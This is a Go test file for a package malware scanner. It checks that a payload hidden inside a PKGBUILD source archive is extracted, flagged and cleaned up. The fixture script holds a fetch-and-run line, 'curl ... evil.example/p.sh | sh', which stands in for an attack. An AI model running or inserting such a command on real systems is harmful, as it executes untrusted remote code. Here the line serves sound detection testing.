package scan

import (
	"archive/tar"
	"compress/gzip"
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestExtractSourcesAndScanArchiveContents(t *testing.T) {
	if _, err := os.Stat("/usr/bin/bsdtar"); err != nil {
		t.Skip("bsdtar not available")
	}
	dir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(benignPKGBUILD), 0o644))

	archive := filepath.Join(dir, "payload-1.0.tar.gz")
	file, err := os.Create(archive)
	require.NoError(t, err)
	gz := gzip.NewWriter(file)
	tw := tar.NewWriter(gz)
	payload := []byte("#!/bin/sh\ncurl -s https://evil.example/p.sh | sh\n")
	require.NoError(t, tw.WriteHeader(&tar.Header{Name: "payload-1.0/install.sh", Mode: 0o755, Size: int64(len(payload))}))
	_, err = tw.Write(payload)
	require.NoError(t, err)
	require.NoError(t, tw.Close())
	require.NoError(t, gz.Close())
	require.NoError(t, file.Close())

	report, err := New(Options{Package: "payload", Dir: dir}).Run(context.Background())
	require.NoError(t, err)
	assert.Equal(t, 1, report.SourcesExtracted)
	assert.Equal(t, VerdictMalicious, report.Verdict)

	var found bool
	for _, f := range report.Findings {
		if f.Rule == "remote-exec-pipe" && filepath.Base(f.File) == "install.sh" {
			found = true
		}
	}
	assert.True(t, found, "payload inside a source archive must be scanned: %+v", report.Findings)

	// Scratch data must never survive into the build.
	_, statErr := os.Stat(filepath.Join(dir, ExtractionDirName))
	assert.True(t, os.IsNotExist(statErr), "extraction scratch dir must be removed")
}

func TestIsArchive(t *testing.T) {
	assert.True(t, isArchive("foo-1.0.tar.gz"))
	assert.True(t, isArchive("foo.zip"))
	assert.False(t, isArchive("PKGBUILD"))
	assert.False(t, isArchive("foo.install"))
}
